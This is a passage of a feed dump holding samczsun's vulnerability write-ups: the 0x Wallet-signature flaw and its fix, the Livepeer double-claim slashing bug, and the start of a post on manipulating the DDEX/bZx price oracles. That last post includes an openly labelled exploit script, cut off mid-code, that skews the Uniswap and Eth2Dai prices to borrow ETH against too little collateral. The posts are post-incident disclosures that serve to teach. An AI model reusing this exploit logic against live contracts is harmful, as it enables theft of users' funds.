isValidWalletSignature(\n            hash,\n            signerAddress,\n            signature\n        );\n        return isValid;\n    }\n    /* snip */\n}</code></pre><figcaption><a href=\"https://github.com/0xProject/0x-monorepo/blob/965d6098294beb22292090c461151274ee6f9a26/packages/contracts/src/2.0.0/protocol/Exchange/MixinSignatureValidator.sol#L104-L113\">Source</a></figcaption></figure><h1 id=\"the-solution\">The Solution</h1><p>To their credit, 0x triaged and fixed this vulnerability in a couple of hours. The relevant commit can be viewed <a href=\"https://github.com/0xProject/0x-monorepo/commit/2171632e1e0f83ca55d7cc0072e3fb6d658219a0\">here</a>, but there&apos;s really only two sections of interest.</p><p>The first change requires that the wallet address contains some code. This behavior matches what the Solidity compiler inserts before performing a function call.</p><pre><code class=\"language-solidity\">if iszero(extcodesize(walletAddress)) {\n    // Revert with `Error(&quot;WALLET_ERROR&quot;)`\n    /* snip */\n    revert(0, 100)\n}</code></pre><p>The second change requires the return data to be exactly 32 bytes long. This is also what the Solidity compiler inserts after performing a function call.</p><pre><code class=\"language-solidity\">if iszero(eq(returndatasize(), 32)) {\n    // Revert with `Error(&quot;WALLET_ERROR&quot;)`\n    /* snip */\n    revert(0, 100)\n}</code></pre><h1 id=\"conclusion\">Conclusion</h1><p>This isn&apos;t the first time that an EVM subtlety has bitten a smart contract developer, and it won&apos;t be the last. However, it&apos;s usually through incidents like this that we all learn about a new dangerous pattern to watch out for. Hopefully through this incident, future developers and auditors will be able to catch similar problems before they make it to mainnet.</p><h2 id=\"further-reading\">Further Reading</h2><ul><li><a href=\"https://medium.com/consensys-diligence/return-data-length-validation-a-bug-we-missed-4b7bbea8e9ab\">ConsenSys Diligence&apos;s post-mortem on this issue</a></li><li><a href=\"https://blog.0xproject.com/post-mortem-0x-v2-0-exchange-vulnerability-763015399578\">0x&apos;s post-mortem on this issue</a></li></ul>","content:encodedSnippet":"On Friday July 12th, 0x shut down their v2 Exchange because a flaw in the signature verification routine meant that a signature of 0x04 was treated as a valid signature for all non-smart-contract accounts. This blog post explains how this is possible.\nBackground\n0x is, when grossly oversimplified, a platform which allows users to trade with other users. If Alice wants to buy 1000 ZRX for 1 ETH, Alice can submit an order through the 0x protocol. If Bob then decides that he wants to take Alice's order, he can use 0x's Exchange contract to securely perform the exchange.\nIn order for the Exchange to make sure that Alice really did make the offer that Bob claims she's making, Bob needs to submit Alice's signature with the order data. This signature is the only thing preventing Bob from claiming that Alice is offering 1000000 ZRX for 1 wei, so it's imperative that signatures can't be forged.\n0x supports several types of signatures. EIP712 and EthSign signatures are based on ECDSA signatures and are cryptographically secure, while Wallet and Validator signatures query an address for the validity of the provided signature. The Wallet signature in particular will query the sender address, and is intended to allow multi-signature wallets to make trades.\nThe Code\nLet's take a look at how 0x verifies a Wallet signature. \n\nfunction isValidWalletSignature(\n    bytes32 hash,\n    address walletAddress,\n    bytes signature\n)\n    internal\n    view\n    returns (bool isValid)\n{\n    bytes memory calldata = abi.encodeWithSelector(\n        IWallet(walletAddress).isValidSignature.selector,\n        hash,\n        signature\n    );\n    assembly {\n        let cdStart := add(calldata, 32)\n        let success := staticcall(\n            gas,              // forward all gas\n            walletAddress,    // address of Wallet contract\n            cdStart,          // pointer to start of input\n            mload(calldata),  // length of input\n            cdStart,          // write output over input\n            32                // output size is 32 bytes\n        )\n\n        switch success\n        case 0 {\n            // Revert with `Error(\"WALLET_ERROR\")`\n            /* snip */\n            revert(0, 100)\n        }\n        case 1 {\n            // Signature is valid if call did not revert and returned true\n            isValid := mload(cdStart)\n        }\n    }\n    return isValid;\n}\nSource\nIf we ignore the fact that this was written in inline assembly, it's fairly straightforward. First, lines 10-14 construct the ABI-encoded data which will be sent to the wallet. Lines 17-24 perform the call to the wallet. Finally, lines 26-34 check whether the call succeeded, and load the returned boolean.\nThe Problem\nWhile the code to validate a Wallet signature was simple enough, it was written without knowledge of at least one of these two subtleties of the EVM:\n1. Executing instructions outside the code is equivalent to executing STOP instructions\nIn most modern computers, executing undefined instructions means that your computer will execute garbage until the program crashes. However, the EVM is special because if execution happens to go outside the code of the smart contract, it's implicitly treated as a STOP instruction. \nSection 9.4\nA side effect of this is that accounts with no code can still be executed - they'll just immediately halt.\n2. While the CALL family of instructions allow specifying where the output should be copied, the output area is not cleared beforehand\nTake a look at this excerpt from the formal definition of the CALL instruction, where µ[5] is where in memory the return data should be copied, µ[6] is the length of the return data to be copied, and o is the data returned by the CALL instruction.\nAppendix H\nThis states that only n bytes will be copied from the returned data to main memory, where n is the minimum of the number of bytes expected and the number of bytes returned. This implies that if less bytes are returned than expected, only the number of bytes returned will be copied to memory.\nGoing back to the validation routine, the authors instructed the EVM to overwrite the input data with the returned data, likely to save gas. Under normal operation, given a hash of 0xAA...AA and a signature of 0x1CFF...FF, the memory before and after a call might look something like this.\nBeforeAfter\nHowever, if there was no data returned by the call, then the memory after the call would look like this:\nAfter\nIn other words, the memory is unchanged. Now, when the code on line 33 loads the first 32 bytes into a boolean variable, the nonzero value is coerced into true. Then, this true is returned from the function, indicating that \"yes, the signature provided is fine\" when it clearly isn't.\nAs for why the magic signature of 0x04 is always considered valid, it's because 0x04 is the ID number for a Wallet type signature, and the signature type is the last byte in the signature array.\n\n// Allowed signature types.\nenum SignatureType {\n    Illegal,         // 0x00, default value\n    Invalid,         // 0x01\n    EIP712,          // 0x02\n    EthSign,         // 0x03\n    Wallet,          // 0x04\n    Validator,       // 0x05\n    PreSigned,       // 0x06\n    NSignatureTypes  // 0x07, number of signature types. Always leave at end.\n}\nSource\nfunction isValidSignature(\n    bytes32 hash,\n    address signerAddress,\n    bytes memory signature\n)\n    public\n    view\n    returns (bool isValid)\n{\n    /* snip */\n\n    // Pop last byte off of signature byte array.\n    uint8 signatureTypeRaw = uint8(signature.popLastByte());\n    \n    /* snip */\n\n    SignatureType signatureType = SignatureType(signatureTypeRaw);\n    \n    /* snip */\n    if (signatureType == SignatureType.Wallet) {\n        isValid = isValidWalletSignature(\n            hash,\n            signerAddress,\n            signature\n        );\n        return isValid;\n    }\n    /* snip */\n}\nSource\nThe Solution\nTo their credit, 0x triaged and fixed this vulnerability in a couple of hours. The relevant commit can be viewed here, but there's really only two sections of interest.\nThe first change requires that the wallet address contains some code. This behavior matches what the Solidity compiler inserts before performing a function call.\nif iszero(extcodesize(walletAddress)) {\n    // Revert with `Error(\"WALLET_ERROR\")`\n    /* snip */\n    revert(0, 100)\n}\nThe second change requires the return data to be exactly 32 bytes long. This is also what the Solidity compiler inserts after performing a function call.\nif iszero(eq(returndatasize(), 32)) {\n    // Revert with `Error(\"WALLET_ERROR\")`\n    /* snip */\n    revert(0, 100)\n}\nConclusion\nThis isn't the first time that an EVM subtlety has bitten a smart contract developer, and it won't be the last. However, it's usually through incidents like this that we all learn about a new dangerous pattern to watch out for. Hopefully through this incident, future developers and auditors will be able to catch similar problems before they make it to mainnet.\nFurther Reading\n\nConsenSys Diligence's post-mortem on this issue\n0x's post-mortem on this issue","dc:creator":"samczsun","content":"An in-depth look at how 0x's Exchange contract was vulnerable","contentSnippet":"An in-depth look at how 0x's Exchange contract was vulnerable","guid":"5d2a7747c57ea20001c67de7","isoDate":"2019-07-14T02:28:27.000Z","from":"https://samczsun.com/rss/","hashId":"6e62438f17250a43b1c92b1059a26586"},{"creator":"samczsun","title":"The Livepeer slashing vulnerability","link":"https://samczsun.com/the-livepeer-slashing-vulnerability/","pubDate":"Tue, 30 Jul 2019 02:44:29 GMT","content:encoded":"<h1 id=\"tl-dr\">tl;dr</h1><p>Improper input validation meant that the same claim could be submitted twice as proof of transcoder double claiming. This would have resulted in loss of funds as well as denial of service of the Livepeer network.</p><h1 id=\"what-is-livepeer\">What is Livepeer?</h1><p><a href=\"https://livepeer.org/#about\">Livepeer</a> is a platform for streaming live video over the internet. One of the ways it facilitates this is by operating a marketplace where GPU time for transcoding videos can be bought and sold.</p><p>This marketplace roughly works as follows. Transcoders who want to sell their GPU time must stake Livepeer Tokens (LPT) and/or have others stake LPT tokens for them. If they&apos;re in the list of top 25 transcoders by tokens staked, then they&apos;re eligible to receive work through the marketplace.</p><p>When a broadcaster wants to buy GPU time to transcode a video, they submit a job through the smart contract system. An active transcoder is randomly matched with this job, and the broadcaster can coordinate with the selected transcoder off-chain.</p><p>The broadcaster breaks down the video they want transcoded into small chunks, called <em>segments</em>. As the transcoder receives segments, they must record on-chain that they&apos;ve begun work on those segments by submitting a <em>claim</em>. Each claim can only contain sequential segments, and certain segments are randomly subjected to further verification by the Livepeer network.</p><p>In order to ensure that malicious transcoders are held accountable, any third party can <em>slash</em> transcoders if certain conditions are met. If a transcoder is slashed, a portion of their staked tokens will be burnt, and they&apos;ll be removed from the list of active transcoders.</p><p>Currently, transcoders may be slashed if they meet one of these two conditions</p><ol><li>The transcoder does not submit the necessary verification for a segment</li><li>The transcoder submitted two claims for the same segment</li></ol><h1 id=\"the-vulnerability\">The Vulnerability</h1><p>Here&apos;s the code which determines whether a transcoder can be slashed for double claiming a segment.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function doubleClaimSegmentSlash(\n uint256 _jobId,\n uint256 _claimId1,\n uint256 _claimId2,\n uint256 _segmentNumber\n) /* snip */ {\n    Job storage job = jobs[_jobId];\n    Claim storage claim1 = job.claims[_claimId1];\n    Claim storage claim2 = job.claims[_claimId2];\n\n    // Claim 1 must not be slashed\n    require(claim1.status != ClaimStatus.Slashed);\n    // Claim 2 must not be slashed\n    require(claim2.status != ClaimStatus.Slashed);\n    // Segment must be in claim 1 segment range\n    require(_segmentNumber &gt;= claim1.segmentRange[0] &amp;&amp; _segmentNumber &lt;= claim1.segmentRange[1]);\n    // Segment must be in claim 2 segment range\n    require(_segmentNumber &gt;= claim2.segmentRange[0] &amp;&amp; _segmentNumber &lt;= claim2.segmentRange[1]);\n\n    // Slash transcoder and provide finder params\n    bondingManager().slashTranscoder(job.transcoderAddress, msg.sender, doubleClaimSegmentSlashAmount, finderFee);\n     \n    refundBroadcaster(_jobId);\n\n    // Set claim 1 as slashed\n    claim1.status = ClaimStatus.Slashed;\n    // Set claim 2 as slashed\n    claim2.status = ClaimStatus.Slashed;\n }</code></pre><figcaption><a href=\"https://github.com/livepeer/protocol/blob/b0cc7bf9b25473e307f4a12220c450df9ede39b1/contracts/jobs/JobsManager.sol#L545-L559\">Source</a></figcaption></figure><p>At first glance, this code looks perfectly fine. Both claims must be valid, and the supposedly double-claimed segment must be included in both claims. While it&apos;s unfortunate that the <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern\">Checks-Effects-Interaction</a> pattern isn&apos;t used, there&apos;s no risk of re-entrancy by <code>bondingManager</code>.</p><p>However, the function does not check that the two specified claims are <em>distinct</em>. This means that any claim of any segment is eligible to be slashed just by calling <code>doubleClaimSegmentSlash</code> with the same claim ID.</p><h1 id=\"the-solution\">The Solution</h1><p>Here&apos;s the one (two if you count comments) line solution, presented in all its glory.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">// The provided claims must be different (i.e different IDs)\nrequire(_claimId1 != _claimId2);</code></pre><figcaption><a href=\"https://github.com/livepeer/protocol/blob/4320a587fa4c0354669933f347202b499a79f2eb/contracts/jobs/JobsManager.sol#L499-L500\">Source</a></figcaption></figure><h1 id=\"the-impact\">The Impact</h1><p>When a transcoder is slashed for double claiming, 3% of their staked LPT is deducted as penalty, with 5% of the penalty going to the finder and the remaining 95% burned. Furthermore, the transcoder is removed from the pool of active transcoders.</p><p>This means that for the top transcoder, who has staked ~1,100,000LPT, a mere 10 false slashes would bring their stake down to ~800,000LPT. Another 40 false slashes (for a total of 50) would result in a meager ~240,000LPT still staked.</p><p>Given that the attacker has the history of the entire world to play with, and can also manipulate transcoders into doing legitimate work by submitting jobs, this scenario is not entirely unrealistic. Furthermore, through the finder&apos;s fee the attacker would have netted 5% of the penalized LPT, resulting in a cool ~43,000LPT (~1500ETH) for their troubles.</p><h1 id=\"key-takeaways\">Key Takeaways</h1><h3 id=\"consider-the-assumptions-made-and-ensure-that-they-are-true\">Consider the assumptions made and ensure that they are true</h3><p>When writing code, assumptions about what sorts of input will be received are made. As the developer works on the code and becomes more and more familiar with it, it&apos;s all too easy to fall into the trap of believing that these assumptions are etched into stone.</p><p>As such, when it comes time to write unit tests (or, even when just reviewing code), it&apos;s a good idea to list out the assumptions that were made and check whether they are really true, or just assumed to be true. In this case the assumption that both claim IDs would be distinct was made, but not enforced.</p><h3 id=\"have-a-response-plan\">Have a response plan</h3><p>Audited code does not equate to secure code, and as such response plans should always be developed in case a situation like this one arises. Due in part to having responded to security incidents before, the Livepeer team was able to quickly triage and resolve this problem. This was aided by their modular contract layout, which allowed them to pause and upgrade implementations as needed.</p><h1 id=\"further-reading\">Further Reading</h1><ul><li><a href=\"https://forum.livepeer.org/t/protocol-paused-for-bug-fix-upgrade-7-29-19-4-21pm-edt-update-protocol-resumed-as-of-8-40pm-edt/841\">The original Livepeer announcement</a></li><li><a href=\"https://forum.livepeer.org/t/transcoder-slashing-vulnerability-retrospective/845\">Livepeer&apos;s post-mortem</a></li></ul>","content:encodedSnippet":"tl;dr\nImproper input validation meant that the same claim could be submitted twice as proof of transcoder double claiming. This would have resulted in loss of funds as well as denial of service of the Livepeer network.\nWhat is Livepeer?\nLivepeer is a platform for streaming live video over the internet. One of the ways it facilitates this is by operating a marketplace where GPU time for transcoding videos can be bought and sold.\nThis marketplace roughly works as follows. Transcoders who want to sell their GPU time must stake Livepeer Tokens (LPT) and/or have others stake LPT tokens for them. If they're in the list of top 25 transcoders by tokens staked, then they're eligible to receive work through the marketplace.\nWhen a broadcaster wants to buy GPU time to transcode a video, they submit a job through the smart contract system. An active transcoder is randomly matched with this job, and the broadcaster can coordinate with the selected transcoder off-chain.\nThe broadcaster breaks down the video they want transcoded into small chunks, called segments. As the transcoder receives segments, they must record on-chain that they've begun work on those segments by submitting a claim. Each claim can only contain sequential segments, and certain segments are randomly subjected to further verification by the Livepeer network.\nIn order to ensure that malicious transcoders are held accountable, any third party can slash transcoders if certain conditions are met. If a transcoder is slashed, a portion of their staked tokens will be burnt, and they'll be removed from the list of active transcoders.\nCurrently, transcoders may be slashed if they meet one of these two conditions\n\nThe transcoder does not submit the necessary verification for a segment\nThe transcoder submitted two claims for the same segment\n\nThe Vulnerability\nHere's the code which determines whether a transcoder can be slashed for double claiming a segment.\n\nfunction doubleClaimSegmentSlash(\n uint256 _jobId,\n uint256 _claimId1,\n uint256 _claimId2,\n uint256 _segmentNumber\n) /* snip */ {\n    Job storage job = jobs[_jobId];\n    Claim storage claim1 = job.claims[_claimId1];\n    Claim storage claim2 = job.claims[_claimId2];\n\n    // Claim 1 must not be slashed\n    require(claim1.status != ClaimStatus.Slashed);\n    // Claim 2 must not be slashed\n    require(claim2.status != ClaimStatus.Slashed);\n    // Segment must be in claim 1 segment range\n    require(_segmentNumber >= claim1.segmentRange[0] && _segmentNumber <= claim1.segmentRange[1]);\n    // Segment must be in claim 2 segment range\n    require(_segmentNumber >= claim2.segmentRange[0] && _segmentNumber <= claim2.segmentRange[1]);\n\n    // Slash transcoder and provide finder params\n    bondingManager().slashTranscoder(job.transcoderAddress, msg.sender, doubleClaimSegmentSlashAmount, finderFee);\n     \n    refundBroadcaster(_jobId);\n\n    // Set claim 1 as slashed\n    claim1.status = ClaimStatus.Slashed;\n    // Set claim 2 as slashed\n    claim2.status = ClaimStatus.Slashed;\n }\nSource\nAt first glance, this code looks perfectly fine. Both claims must be valid, and the supposedly double-claimed segment must be included in both claims. While it's unfortunate that the Checks-Effects-Interaction pattern isn't used, there's no risk of re-entrancy by bondingManager.\nHowever, the function does not check that the two specified claims are distinct. This means that any claim of any segment is eligible to be slashed just by calling doubleClaimSegmentSlash with the same claim ID.\nThe Solution\nHere's the one (two if you count comments) line solution, presented in all its glory.\n\n// The provided claims must be different (i.e different IDs)\nrequire(_claimId1 != _claimId2);\nSource\nThe Impact\nWhen a transcoder is slashed for double claiming, 3% of their staked LPT is deducted as penalty, with 5% of the penalty going to the finder and the remaining 95% burned. Furthermore, the transcoder is removed from the pool of active transcoders.\nThis means that for the top transcoder, who has staked ~1,100,000LPT, a mere 10 false slashes would bring their stake down to ~800,000LPT. Another 40 false slashes (for a total of 50) would result in a meager ~240,000LPT still staked.\nGiven that the attacker has the history of the entire world to play with, and can also manipulate transcoders into doing legitimate work by submitting jobs, this scenario is not entirely unrealistic. Furthermore, through the finder's fee the attacker would have netted 5% of the penalized LPT, resulting in a cool ~43,000LPT (~1500ETH) for their troubles.\nKey Takeaways\nConsider the assumptions made and ensure that they are true\nWhen writing code, assumptions about what sorts of input will be received are made. As the developer works on the code and becomes more and more familiar with it, it's all too easy to fall into the trap of believing that these assumptions are etched into stone.\nAs such, when it comes time to write unit tests (or, even when just reviewing code), it's a good idea to list out the assumptions that were made and check whether they are really true, or just assumed to be true. In this case the assumption that both claim IDs would be distinct was made, but not enforced.\nHave a response plan\nAudited code does not equate to secure code, and as such response plans should always be developed in case a situation like this one arises. Due in part to having responded to security incidents before, the Livepeer team was able to quickly triage and resolve this problem. This was aided by their modular contract layout, which allowed them to pause and upgrade implementations as needed.\nFurther Reading\n\nThe original Livepeer announcement\nLivepeer's post-mortem","dc:creator":"samczsun","content":"What happens when good intentions go bad?","contentSnippet":"What happens when good intentions go bad?","guid":"5d3f25a0dcad17000113946e","isoDate":"2019-07-30T02:44:29.000Z","from":"https://samczsun.com/rss/","hashId":"b576746b355d3be974ac066bc95c38ba"},{"creator":"samczsun","title":"Taking undercollateralized loans for fun and for profit","link":"https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/","pubDate":"Mon, 30 Sep 2019 16:20:35 GMT","content:encoded":"<h1 id=\"tl-dr\">tl;dr</h1><p>By relying on an on-chain decentralized price oracle without validating the rates returned, <a href=\"https://margin.ddex.io\">DDEX</a> and <a href=\"https://bzx.network\">bZx</a> were susceptible to atomic price manipulation. This would have resulted in the loss of liquid ETH in the ETH/DAI market for DDEX, and loss of all liquid funds in bZx. Fortunately, no funds were actually lost.</p><h1 id=\"what-is-decentralized-lending\">What is decentralized lending?</h1><p>First, let&apos;s talk about traditional lending. When you take out a loan, you typically need to provide some sort of collateral so that if you default on your loan, the lender can then seize the collateral. In order to determine how much collateral you need to supply, the lender typically knows or can reliably calculate the fair market value (FMV) of the collateral.</p><p>In decentralized lending, the same process occurs except now the lender is a smart contract that is isolated from the outside world. This means that it can&apos;t simply &quot;know&quot; the FMV of whatever collateral you&apos;re trying to provide.</p><p>To solve this problem, developers instruct the smart contract to query an <em>oracle</em>, which accepts the address of a token and returns the current price of that token in a desired currency (for example, ETH or USD). Different DeFi projects have taken different approaches to implementing this oracle, but they can generally all be classified in one of five ways (although some implementations blur the lines more than others):</p><ol><li>Off-chain Centralized Oracle<br>This type of oracle simply accepts new prices from an off-chain source, typically an account controlled by the project. Due to the need to quickly update the oracle with new exchange rates, the account is typically an EOA and not a multisig. There may be some sanity checking to ensure that prices don&apos;t fluctuate too wildly. <a href=\"https://compound.finance\">Compound Finance</a> and <a href=\"https://www.synthetix.io\">Synthetix</a> mainly use this type of oracle for most assets</li><li>Off-chain Decentralized Oracle<br>This type of oracle accepts new prices from multiple off-chain sources and merges the values through a mathematical function, such as an average. In this model, a multisig wallet is typically used to manage the list of authorized sources. <a href=\"https://makerdao.com/feeds/\">Maker</a> uses this type of oracle for ETH and other assets</li><li>On-chain Centralized Oracle<br>This type of oracle determines the price of assets using an on-chain source, such as a DEX. However, only a central authority can trigger the oracle to read from the on-chain source. Like an off-chain centralized oracle, this type of oracle requires rapid updates and as such the triggering account is likely an EOA and not a multisig. <a href=\"https://dydx.exchange\">dYdX</a> and <a href=\"https://nuo.network\">Nuo</a> use this type of oracle for certain assets</li><li>On-chain Decentralized Oracle<br>This type of oracle determines the price of assets using an on-chain source, but can be updated by anyone. There may be some sanity checking to ensure that prices don&apos;t fluctuate too wildly. <a href=\"https://margin.ddex.io\">DDEX</a> uses this type oracle for DAI, while <a href=\"https://bzx.network\">bZx</a> uses this type of oracle for all assets</li><li>Constant Oracle<br>This type of oracle simply returns a constant value, and is typically used for stablecoins. Nearly all projects mentioned above use this type of oracle for USDC due to its guaranteed peg</li></ol><h1 id=\"the-problem\">The problem</h1><p>While searching for additional vulnerable projects, I came across this tweet.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">I&apos;m honestly worried they&apos;re using it as a price feed. If my hunch is right that&apos;s so attackable....</p>&#x2014; Vitalik Non-giver of Ether (@VitalikButerin) <a href=\"https://twitter.com/VitalikButerin/status/1098168793178820609?ref_src=twsrc%5Etfw\">February 20, 2019</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>Someone asked for clarification, and the Uniswap project responded with the following.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Because it is possible to make a huge trade, use a function that checks the price oracle, then execute another huge trade synchronously using smart contracts. This means the attacker only loses fees and can&#x2019;t get arbed. <br><br>Working on improving Uniswap as an oracle in the future.</p>&#x2014; Uniswap &#x1F984; (@UniswapExchange) <a href=\"https://twitter.com/UniswapExchange/status/1098268734236565508?ref_src=twsrc%5Etfw\">February 20, 2019</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>These tweets explain the problem very clearly, but it&apos;s important to note that this problem exists for any oracle which can provide the FMV on-chain, not just Uniswap.</p><p>In general, if a price oracle is completely decentralized, then an attacker can manipulate the apparent price at a specific instant with minimal to no loss in slippage fees. If an attacker can then convince a DeFi dApp to check the oracle at the instant when the apparent price has been manipulated, then they can cause significant harm to the system. In the case of DDEX and bZx, it was possible to take out a loan that appeared to be sufficiently collateralized, but was in fact undercollateralized. </p><h1 id=\"ddex-hydro-protocol-\">DDEX (Hydro Protocol)</h1><p>DDEX is a decentralized exchange platform but are in the process of expanding into decentralized lending so that they can offer their users the ability to create leveraged long and short positions. They&apos;re currently beta testing their decentralized margin exchange.</p><p>On September 9th 2019, DDEX added DAI as an asset to their margin trading platform and enabled the ETH/DAI market. For the oracle, they specified <a href=\"https://etherscan.io/address/0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8\">this</a> smart contract which returns the value of DAI/USD by calculating <code>PriceOfETHInUSD/PriceOfETHInDAI</code>. The value of ETH/USD is read from the Maker oracle, while the value of ETH/DAI is read from either Eth2Dai, or if the spread is too great, Uniswap.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function peek()\n\tpublic\n\tview\n\treturns (uint256 _price)\n{\n\tuint256 makerDaoPrice = getMakerDaoPrice();\n\n\tif (makerDaoPrice == 0) {\n\t\treturn _price;\n\t}\n\n\tuint256 eth2daiPrice = getEth2DaiPrice();\n\n\tif (eth2daiPrice &gt; 0) {\n\t\t_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);\n\t\treturn _price;\n\t}\n\n\tuint256 uniswapPrice = getUniswapPrice();\n\n\tif (uniswapPrice &gt; 0) {\n\t\t_price = makerDaoPrice.mul(ONE).div(uniswapPrice);\n\t\treturn _price;\n\t}\n\n\treturn _price;\n}\n\nfunction getEth2DaiPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\tif (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {\n\t\treturn 0;\n\t}\n\n\tuint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);\n\tuint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);\n\n\tuint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);\n\tuint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);\n\n\tuint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);\n\n\tif (spread &gt; eth2daiMaxSpread) {\n\t\treturn 0;\n\t} else {\n\t\treturn bidPrice.add(askPrice).div(2);\n\t}\n}\n\nfunction getUniswapPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\tuint256 ethAmount = UNISWAP.balance;\n\tuint256 daiAmount = DAI.balanceOf(UNISWAP);\n\tuint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);\n\n\tif (ethAmount &lt; uniswapMinETHAmount) {\n\t\treturn 0;\n\t} else {\n\t\treturn uniswapPrice;\n\t}\n}\n\nfunction getMakerDaoPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\t(bytes32 value, bool has) = makerDaoOracle.peek();\n\n\tif (has) {\n\t\treturn uint256(value);\n\t} else {\n\t\treturn 0;\n\t}\n}</code></pre><figcaption><a href=\"https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L89-L155\">Source</a></figcaption></figure><p>In order to trigger an update and cause the oracle to refresh its stored value, a user simply has to call <code>updatePrice()</code>.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function updatePrice()\n\tpublic\n\treturns (bool)\n{\n\tuint256 _price = peek();\n\n\tif (_price != 0) {\n\t\tprice = _price;\n\t\temit UpdatePrice(price);\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}</code></pre><figcaption><a href=\"https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L74-L87\">Source</a></figcaption></figure><h2 id=\"the-attack\">The attack</h2><p>Let&apos;s assume we can manipulate the apparent value of DAI/USD. If this is the case, we would like to use this to borrow all of the ETH in the system while providing as little DAI as possible. To achieve this, we can either lower the apparent value of ETH/USD or increase the apparent value of DAI/USD. Since we&apos;re already assuming that the apparent value of DAI/USD is manipulable, we&apos;ll choose the latter.</p><p>To increase the apparent value DAI/USD, we can either increase the apparent value of ETH/USD, or decrease the apparent value of ETH/DAI. For all intents and purposes manipulating Maker&apos;s oracle is impossible, so we&apos;ll try decreasing the apparent value of ETH/DAI.</p><p>The oracle will calculate the value of ETH/DAI as reported by Eth2Dai by taking the average of the current asking price and the current bidding price. In order to decrease this value, we&apos;ll need to lower the current bidding price by filling existing orders and then lower the current asking price by placing new orders.</p><p>However, this requires a significant initial investment (as we need to fill orders then make an equivalent number of orders) and is non-trivial to implement. On the other hand, we can drop the Uniswap price simply by selling a large amount of DAI to Uniswap. As such, we&apos;ll aim to bypass the Eth2Dai logic and manipulate the Uniswap price.</p><p>In order to bypass Eth2Dai, we need to manipulate the magnitude of the spread. We can do this in one of two ways:</p><ol><li>Clear out one side of the orderbook while leaving the other alone. This causes spread to increase positively</li><li>Force a crossed orderbook by listing an extreme buy or sell order. This causes spread to decrease negatively.</li></ol><p>While option 2 would result in no losses from taking unfavorable orders, the use of SafeMath disallows a crossed orderbook and as such is unavailable to us. Instead, we&apos;ll force a large positive spread by clearing out one side of the orderbook. This will cause the DAI oracle to fallback to Uniswap to determine the price of DAI. Then, we can cause the Uniswap price of DAI/ETH to drop by buying a large amount of DAI. Once the apparent value of DAI/USD has been manipulated, it&apos;s trivial to take out a loan like as usual.</p><h3 id=\"demo\">Demo</h3><p>The following script will turn a profit of approximately 70 ETH by:</p><ol><li>Clearing out Eth2Dai&apos;s sell orders until the spread is large enough that the oracle rejects the price</li><li>Buying more DAI from Uniswap, dropping the price from 213DAI/ETH to 13DAI/ETH</li><li>Borrowing all the available ETH (~120) for a small amount of DAI (~2500)</li><li>Selling the DAI we bought from Uniswap back to Uniswap</li><li>Selling the DAI we bought from Eth2Dai back to Eth2Dai</li><li>Resetting the oracle (don&apos;t want anyone else abusing our favorable rates)</li></ol><pre><code class=\"language-solidity\">contract DDEXExploit is Script, Constants, TokenHelper {\n    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);\n    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);\n    \n    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);\n    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);\n    \n    uint16 private constant ETHDAI_MARKET_ID = 1;\n    \n    uint private constant INITIAL_BALANCE = 25000 ether;\n    \n    function setup() public {\n        name(&quot;ddex-exploit&quot;);\n        blockNumber(8572000);\n    }\n    \n    function run() public {\n        begin(&quot;exploit&quot;)\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.skewRates)\n            .then(this.checkRates)\n            .then(this.steal)\n            .then(this.cleanup)\n            .then(this.checkProfits);\n    }\n    \n    function checkRates() external {\n        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);\n        uint daiPrice = DAI_ORACLE.getPrice(DAI);\n        \n        printf(&quot;eth=%.18u dai=%.18u\\n&quot;, abi.encode(ethPrice, daiPrice));\n    }\n    \n    uint private boughtFromMatchingMarket = 0;\n    \n    function skewRates() external {\n        skewUniswapPrice();\n        skewMatchingMarket();\n        require(DAI_ORACLE.updatePrice());\n    }\n    \n    function skewUniswapPrice() internal {\n        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);\n    }\n    \n    function skewMatchingMarket() internal {\n        uint start = DAI.balanceOf(address(this));\n        WETH.deposit.value(address(this).balance)();\n        WETH.approve(address(MATCHING_MARKET), uint(-1));\n        while (DAI_ORACLE.getEth2DaiPrice() != 0) {\n            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));\n        }\n        boughtFromMatchingMarket = 